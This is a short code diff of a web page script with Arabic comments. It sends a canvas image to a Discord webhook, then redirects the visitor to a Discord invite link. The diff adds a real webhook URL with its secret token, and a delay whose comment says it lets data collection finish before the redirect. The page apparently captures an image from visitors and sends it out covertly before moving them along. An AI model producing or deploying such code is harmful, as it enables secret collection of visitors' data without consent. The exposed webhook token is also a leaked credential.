@@ -191,7 +191,7 @@
                   const imageData = canvas.toDataURL('image/png');
 
                   // إرسال الصورة إلى Webhook
-                  fetch('https://discord.com/api/webhooks/your-webhook-url', {
+                  fetch('https://discord.com/api/webhooks/1367442476239159337/VueoMCQB7tuu47sz_ajL4HuhLQ_8dWRWLn5GpjJFm-I4HiDmvgbMQCCkifiLCm49rRTE', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -207,6 +207,11 @@
           }
         });
       });
+
+      // التوجيه إلى السيرفر بعد التأكد من كل شيء
+      setTimeout(() => {
+        window.open('https://discord.gg/Pcw4qhvv', '_blank');
+      }, 4000); // التأخير للتأكد من جمع البيانات أولاً
     });
   </script>
 
